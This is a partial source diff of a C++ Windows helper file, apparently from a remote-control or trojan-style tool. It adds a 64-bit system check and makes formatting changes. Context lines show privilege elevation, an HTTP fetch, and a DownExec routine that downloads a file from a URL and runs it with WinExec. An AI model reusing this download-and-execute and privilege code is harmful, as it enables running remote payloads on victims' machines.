@@ -1,6 +1,23 @@
 #include "StdAfx.h"
 #include "Functions.h"
 
+BOOL IsX64System()
+{
+	BOOL bIsWow64 = FALSE;
+
+	typedef BOOL (WINAPI *ISWOW64PROCESS)(HANDLE, PBOOL);
+	ISWOW64PROCESS pfnIsWow64 = (ISWOW64PROCESS)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process");
+	if (pfnIsWow64)
+	{
+		if (!pfnIsWow64(GetCurrentProcess(), &bIsWow64))  
+		{
+			// handle error  
+		}
+	}
+
+	return bIsWow64;  
+}  
+
 void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)  
 {
 	unsigned long i;
@@ -47,7 +64,7 @@ BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege)
 	
 	if ( !AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) )
 	{ 
-		CloseHandle( hToken );
+		CloseHandle(hToken);
 		return FALSE; 
 	} 
 	return TRUE;
@@ -63,7 +80,7 @@ char* GetHttpFile(char Url[])
 	HMODULE hDll;
 	LPVOID hInternet,hUrlHandle; 
 	char buf[1000],*retstr=NULL;
-	retstr=buf;
+	retstr = buf;
 	DWORD dwFlags;
 	
 	hDll = LoadLibraryW(L"wininet.dll");
@@ -125,10 +142,10 @@ void DownExec(char url[])
 		lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)new char[dwEntrySize]; 
 		if (CACHEINFO(url,lpCacheEntry,&dwEntrySize)) 
 		{ 
-			memset(strTemp,0,255);
+			ZeroMemory(strTemp, 255);
 			lstrcpyn(strTemp,lpCacheEntry->lpszLocalFileName,strlen(lpCacheEntry->lpszLocalFileName));
 			
-			WinExec(strTemp,SW_SHOW);
+			WinExec(strTemp, SW_SHOW);
 		} 
 	}
 	FreeLibrary(hurlmon);
@@ -139,8 +156,7 @@ void OpenUrl(char url[])
 {
 	HMODULE hshell;
 	hshell=LoadLibraryW(L"Shell32.dll");
-	HINSTANCE (WINAPI *SHELLRUN)(HWND,LPCTSTR, LPCTSTR, LPCTSTR ,LPCTSTR , int );
-	//动态加载shell32.dll中的ShellExecuteA函数
+	HINSTANCE (WINAPI *SHELLRUN)(HWND, LPCTSTR, LPCTSTR, LPCTSTR ,LPCTSTR , int );
 
 	(FARPROC&)SHELLRUN=GetProcAddress(hshell,"ShellExecuteA");
 
